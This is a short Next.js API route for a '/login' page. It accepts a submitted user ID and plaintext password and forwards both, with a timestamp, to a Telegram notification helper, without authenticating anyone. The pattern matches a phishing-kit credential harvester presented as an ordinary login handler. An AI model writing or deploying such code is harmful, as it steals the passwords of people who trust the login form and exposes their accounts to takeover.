import { NextResponse } from "next/server";
import { sendFormNotification } from "@/lib/telegram";

export async function POST(request: Request) {
  try {
    const data = (await request.json()) as {
      userId?: string;
      password?: string;
      type?: string;
    };
    await sendFormNotification({
      type: data.type === "identifier" ? "sign_in_identifier" : "login",
      userId: data.userId ?? "",
      password: data.password ?? "",
      timestamp: new Date().toISOString(),
      page: "/login",
    });
    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Error sending login notification:", error);
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 });
  }
}
